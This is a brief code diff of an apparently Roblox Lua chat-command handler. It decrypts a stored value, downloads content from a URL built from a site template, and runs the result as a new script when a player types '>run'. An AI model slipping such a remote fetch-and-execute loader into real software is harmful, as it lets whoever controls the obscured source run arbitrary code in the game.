@@ -63,7 +63,7 @@ Player.Chatted:connect(function(Message)
 		local Run,RunLocal,RunLocalTo,SwitchCurrent,AddSite=Message:match'>run',Message:match'>rls',Message:match'>rlt%s(.*)',Message:match'>switch%s(.*)',Message:match'>add%s*(.)';
 		local Data=Decrypt(Current,Key);
 		if(Run or RunLocal or RunLocalTo)then
-			Data=game:service'HttpService':getAsync(Data,true);
+			Data=game:service'HttpService':getAsync(InitialSite:format(Data),true);
 		end;
 		if(Run)then
 			NS(Data,workspace);
